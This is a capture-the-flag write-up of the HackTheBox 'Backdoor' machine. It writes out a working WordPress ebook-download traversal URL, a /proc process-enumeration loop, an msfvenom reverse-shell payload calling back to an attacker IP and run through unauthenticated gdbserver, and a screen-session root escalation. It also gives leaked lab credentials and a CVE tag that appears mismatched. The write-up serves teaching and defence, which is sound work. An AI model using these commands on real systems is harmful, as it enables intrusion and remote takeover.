---
title: "Backdoor"
date: 2021-11-27
type: docs
tags:
  - htb
  - linux
  - easy
  - wordpress
  - directory-traversal
  - lfi
  - proc-enumeration
  - gdbserver
  - cve-2020-8558
  - screen
  - shared-screen-session
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu), **Difficulty:** Easy, **Released:** 2021-11-27, **IP:** `10.10.11.125` → `backdoor.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. WordPress 5.8.1 on `:80` + an unknown service on **1337**. The **`ebook-download`** plugin is vulnerable to **directory traversal** (`filedownload.php?ebookdownloadurl=../../../wp-config.php`).
2. Turn the traversal into a general LFI: read `/proc/sched_debug` and `/proc/<pid>/cmdline` to enumerate running processes → discover **`gdbserver`** bound to **1337**.
3. `gdbserver` with no auth lets a remote GDB client upload and `run` an ELF → generate a reverse-shell ELF with `msfvenom`, `target extended-remote 10.10.11.125:1337`, `run` → shell as **`user`**.
4. Root: a cron runs GNU **`screen`** as root with a predictable session name. `screen -x root/root` attaches to it → root shell.

</div>

<div class="callout callout-key">

**Credentials & Flags**


| Where | Value |
| --- | --- |
| `wp-config.php` DB creds (not needed for the path) | `wordpressuser : MQYBJSaD#DxG6qbm` |
| `user.txt` | `/home/user/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Backdoor is the box that really drove home a lesson I now apply on every engagement involving a file-read primitive: a limited file read is never just a limited file read on Linux. I started this one expecting the usual WordPress plugin vulnerability to hand me a shell outright, but instead it handed me something more interesting, a directory traversal bug in the `ebook-download` plugin that only let me pull files off disk. On its own that's a modest win: I could read configs and source, but nothing executable. The insight that turned the box around for me was remembering that Linux exposes its entire process table as plain files under `/proc`. Once I made that connection, my file-read bug became a process-enumeration bug: I could ask the machine "what is currently running, and with what arguments" without ever getting a shell, and that's precisely how I tracked down an otherwise silent, unnamed service sitting on port 1337.

That service turned out to be `gdbserver`, and recognizing it was the other half of the puzzle. I find this step particularly satisfying to explain because it's such a clean, teachable primitive: an unauthenticated remote debugging daemon *is* remote code execution, by design rather than by accident. There's no auth layer standing between a GDB client and arbitrary code execution as whatever user launched the stub. Root escalation, by contrast, was far more mundane and came down to a classic misconfiguration: a shared `screen` socket that let me attach to a root-owned session by simply knowing its name.

I've grouped a few related boxes below because these individual techniques show up constantly in my other writeups. For more LFI/traversal chains, see [Inject](/writeups/hackthebox/linux/easy/inject/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), and [Bagel](/writeups/hackthebox/linux/medium/bagel/). For more on turning a read primitive into `/proc` enumeration, see [Jupiter](/writeups/hackthebox/linux/medium/jupiter/). For unusual-service RCE in the same spirit as `gdbserver`, see [Antique](/writeups/hackthebox/linux/easy/antique/) (JetDirect `exec`) and [PC](/writeups/hackthebox/linux/easy/pc/) (gRPC). For more shared `screen`/`tmux` root sockets, see [CyberCrafted](/writeups/tryhackme/linux/medium/cybercrafted/).

---

## Full Walkthrough

### Recon

```console
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
80/tcp   open     http    Apache httpd 2.4.41 ((Ubuntu))
| http-enum:
|   /wp-login.php: Wordpress login page.
|   /: WordPress version: 5.8.1
1337/tcp open     unknown
2605/tcp filtered bgpd
```

My initial nmap scan came back with the usual noise: the `vulners` script alone dumped roughly ninety CVE references against the SSH and Apache versions in play. I skimmed through them out of due diligence, but none of them turned out to be the actual path in, so I've trimmed that output here rather than padding the writeup with dead ends.

I ran WPScan alongside nmap's `http-wordpress-users` script and confirmed there was a single WordPress user, `admin`, on the box. A `dirsearch` pass showed a completely standard WordPress layout, and `/wp-config.php` was present but returned `0B`, which made sense since PHP parses that file server-side, meaning a normal HTTP request was never going to hand me the source directly.

Poking at `http://backdoor.htb/wp-links-opml.php`, I got back XML containing a `<!-- generator="WordPress/5.8.1" -->` comment, which pinned down the exact WordPress version I was dealing with. I also circled back to that mystery service on port **1337** to see if it would say anything unprompted:

```console
❯ nc backdoor.htb 1337 -vv
backdoor.htb [10.10.11.125] 1337 (menandmice-dns) open
```

The `menandmice-dns` label nmap attached to it is nothing more than a guess based on the port number, since 1337 has no fixed association with that service, so I disregarded it and kept treating the port as unknown.

### Plugin directory traversal

Since chasing WordPress user enumeration wasn't leading anywhere fast, I decided to poke at the plugins directory directly. Directory listing was enabled on `http://backdoor.htb/wp-content/plugins/`, which handed me the full plugin list without any guesswork, and one name immediately caught my eye: **`ebook-download`**, a plugin I recognized as having a history of disclosed vulnerabilities.

<div class="callout callout-note">

**`ebook-download` traversal (EDB-39575)**

Digging into `filedownload.php`, I found it takes an `ebookdownloadurl` parameter and streams back whatever path is handed to it, with **no traversal filtering and no authentication check** at all. That meant a payload like `?ebookdownloadurl=../../../wp-config.php` could walk straight out of the plugin's folder and land on the WordPress root, pulling files I was never meant to see. What made this especially useful is that the file gets *streamed as a download* rather than executed by the PHP interpreter, so I got back the raw source of `wp-config.php` instead of a blank page, database credentials included, something a normal request to that file would never expose. One annoyance I ran into: the response comes back with the payload string echoed a few times at the top, a bug in the plugin's own code, so I had to strip that off before the PHP source underneath was usable.

</div>

```bash
curl 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php'
```

```php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );
define( 'DB_HOST', 'localhost' );
```

Those database credentials didn't lead anywhere useful on their own since MySQL wasn't exposed externally, so I decided to treat the traversal as a **generic LFI** primitive instead and see how far I could push it. I also noticed that hitting the endpoint from a browser triggers a `<script>window.close()</script>` tacked onto the response, a side effect of the plugin's odd `Content-Disposition` handling, so I switched to `curl` for every subsequent request to avoid that noise entirely. As a sanity check that the primitive was solid, I read `/etc/passwd` first and confirmed it worked cleanly, which also told me there was a `user` account on the box worth keeping in mind.

### `/proc` → find `gdbserver`

With the LFI confirmed, I turned to an idea that had been forming in my head as I worked: if this is genuinely an arbitrary file read, I should be able to read anything the web server's user can see, and on Linux that includes the entire contents of `/proc`. My plan was to first get a rough sense of how many processes were running on the box, then loop through every PID's `cmdline` file looking for anything unusual.

```bash
# how many PIDs? read the scheduler debug file
curl -s 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/sched_debug'

# then loop /proc/<pid>/cmdline for each
for i in $(seq 1 2000); do
  echo -n "PID $i: "
  curl -s "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/$i/cmdline" | tr '\0' ' '
  echo
done | grep -a gdbserver
```

```console
PID 8xx: /usr/bin/gdbserver --once 0.0.0.0:1337 /bin/true
```

<div class="callout callout-note">

**Enumerating processes through an LFI**

`/proc/<pid>/cmdline` is the null-separated argv of a running process, world-readable for your own and often for others. `/proc/sched_debug` and `/proc/<pid>/status` give you the PID list to iterate. This converts *any* file-read bug into `ps aux`. Invaluable for spotting internal services, cron jobs, and credentials passed on the command line. Also try `/proc/<pid>/environ`, `/proc/<pid>/cwd`, `/proc/net/tcp`.

</div>

### `gdbserver` → shell as `user`

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.26 LPORT=9001 -f elf -o rev.elf
```

```console
❯ gdb -q
(gdb) target extended-remote 10.10.11.125:1337
(gdb) remote put rev.elf /tmp/rev.elf
(gdb) set remote exec-file /tmp/rev.elf
(gdb) run
```

`nc -lvnp 9001` catches a shell as `user`; grab `user.txt`.

<div class="callout callout-note">

**Unauthenticated `gdbserver` = RCE (relates to CVE-2020-8558-style exposure)**

`gdbserver host:port /program` opens a debugging stub with **no authentication**. Any GDB client that connects can upload a file (`remote put`), set it as the exec target, and `run` it. Arbitrary code execution as whatever user launched `gdbserver` (here `user`, via a cron with `--once`). Never expose `gdbserver` on a routable interface; bind it to `127.0.0.1` and tunnel over SSH.

</div>

### Privilege Escalation. Shared `screen` session

`linpeas` / manual enumeration shows a root process running `screen`, and a cron restarting it. GNU `screen` sessions can be *attached to* by name if the socket permissions allow it (SUID-root `screen`, or a multiuser session):

```bash
screen -x root/root
```

```console
root@Backdoor:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Backdoor:~# cat /root/root.txt
```

<div class="callout callout-note">

**Why the attach works**

On Backdoor, `screen` is SUID root and a root-owned detached session named `root` exists (recreated by cron). `screen -x <user>/<session>` attaches to another user's session; with SUID `screen` the socket in `/run/screen/S-root` is reachable and you drop straight into root's live terminal. The general lesson: SUID `screen`/`tmux` plus any attacker-reachable session name is game over. Same idea on [CyberCrafted](/writeups/tryhackme/linux/medium/cybercrafted/).

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/user/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons & Takeaways

- **A file-read bug is a process-enumeration bug** thanks to `/proc`. Always pivot LFI → `/proc/<pid>/cmdline` / `environ`.
- **Turn off directory listing** and remove unused WordPress plugins. `ebook-download` was abandoned years ago.
- **Never expose `gdbserver`** (or any debugger stub) on `0.0.0.0`.
- **SUID `screen`/`tmux` is dangerous.** Remove the SUID bit; if you need multiuser screen, lock it down with `aclchg`.
- Use `curl`, not a browser, when a "download" endpoint injects HTML/JS into the response.

---

## Related Writeups

- **LFI / path traversal:** [Inject](/writeups/hackthebox/linux/easy/inject/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), [Bagel](/writeups/hackthebox/linux/medium/bagel/), [Heal](/writeups/hackthebox/linux/medium/heal/)
- **`/proc` process enumeration:** [Jupiter](/writeups/hackthebox/linux/medium/jupiter/)
- **Unusual service → RCE:** [Antique](/writeups/hackthebox/linux/easy/antique/), [PC](/writeups/hackthebox/linux/easy/pc/)
- **Shared `screen` / `tmux` socket to root:** [CyberCrafted](/writeups/tryhackme/linux/medium/cybercrafted/)
- **WordPress footholds:** [Blocky](/writeups/hackthebox/linux/easy/blocky/), [Smol](/writeups/tryhackme/linux/medium/smol/), [Avenger](/writeups/tryhackme/windows/medium/avenger/)

## References

- ebook-download traversal <https://www.exploit-db.com/exploits/39575>
- gdbserver remote protocol <https://sourceware.org/gdb/current/onlinedocs/gdb/Remote-Protocol.html>
- GTFOBins: screen <https://gtfobins.github.io/gtfobins/screen/>
